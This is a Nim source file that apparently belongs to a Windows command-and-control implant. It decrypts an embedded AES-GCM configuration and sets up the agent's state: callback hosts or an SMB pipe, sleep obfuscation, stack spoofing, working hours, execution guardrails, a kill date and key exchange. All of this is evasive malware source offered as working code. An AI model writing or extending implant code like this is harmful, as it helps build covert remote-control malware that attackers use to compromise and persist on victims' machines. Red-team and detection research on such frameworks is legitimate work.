import winim/lean
import tables
import ../utils/io
import ../../../common/[utils, crypto, profile, serialize]
import ../../../types/[common, agent]

const CONFIGURATION {.strdefine.}: string = ""

proc deserializeConfiguration(config: string): AgentCtx = 
    
    var unpacker = Unpacker.init(config) 
        
    var aesKey = unpacker.getByteArray(Key)
    let 
        iv = unpacker.getByteArray(Iv)
        authTag = unpacker.getByteArray(AuthenticationTag)
        length = int(unpacker.getUint32())  

    # Decrypt profile configuration
    let (decData, gmac) = decrypt(aesKey, iv, unpacker.getBytes(length))
    wipeKey(aesKey)

    if gmac != authTag: 
        raise newException(CatchableError, protect("Invalid authentication tag."))

    # Parse decrypted profile configuration 
    unpacker = Unpacker.init(Bytes.toString(decData))
    let 
        listenerId = Uuid.toString(unpacker.getUint32())
        callback = unpacker.getDataWithLengthPrefix()

    var agentKeyPair = generateKeyPair() 

    result = AgentCtx(
        agentId: generateUUID(),
        sleepSettings: SleepSettings(
            sleepDelay: unpacker.getUint32(),
            jitter: unpacker.getUint32(),
            sleepTechnique: cast[SleepObfuscationTechnique](unpacker.getUint8()),
            spoofStack: cast[bool](unpacker.getUint8()),
            workingHours: WorkingHours(
                enabled: cast[bool](unpacker.getUint8()),
                startHour: cast[int32](unpacker.getUint32()),
                startMinute: cast[int32](unpacker.getUint32()),
                endHour: cast[int32](unpacker.getUint32()),
                endMinute: cast[int32](unpacker.getUint32())
            )
        ),
        guardrails: Guardrails(
            guardrails: unpacker.getUint32(),
            domain: unpacker.getDataWithLengthPrefix(),
            ip: unpacker.getDataWithLengthPrefix(),
            hostname: unpacker.getDataWithLengthPrefix()
        ),
        killDate: cast[int64](unpacker.getUint64()),
        sessionKey: deriveSessionKey(agentKeyPair, unpacker.getByteArray(Key)),
        agentPublicKey: agentKeyPair.publicKey,
        profile: parseString(unpacker.getDataWithLengthPrefix())
    )

    when defined(TRANSPORT_HTTP): 
        result.transport = TransportSettings(
            listenerId: listenerId,
            hosts: callback
        )

    when defined(TRANSPORT_SMB): 
        result.transport = TransportSettings(
            listenerId: listenerId,
            pipe: callback,
            hPipe: 0 # Initialize to 0
        )

    wipeKey(agentKeyPair.privateKey)
    print protect("[+] Profile configuration deserialized.")

proc init*(T: type AgentCtx): AgentCtx = 

    try: 
        when not defined(CONFIGURATION):
            raise newException(CatchableError, protect("Missing agent configuration."))

        var ctx = deserializeConfiguration(CONFIGURATION)
        ctx.registered = false
        ctx.links = initTable[uint32, uint32]() 
        ctx.jobs = @[]
        ctx.hWakeupEvent = CreateEventA(nil, FALSE, FALSE, nil)
        return ctx

    except CatchableError as err:
        print protect("[-] "), err.msg
        return nil



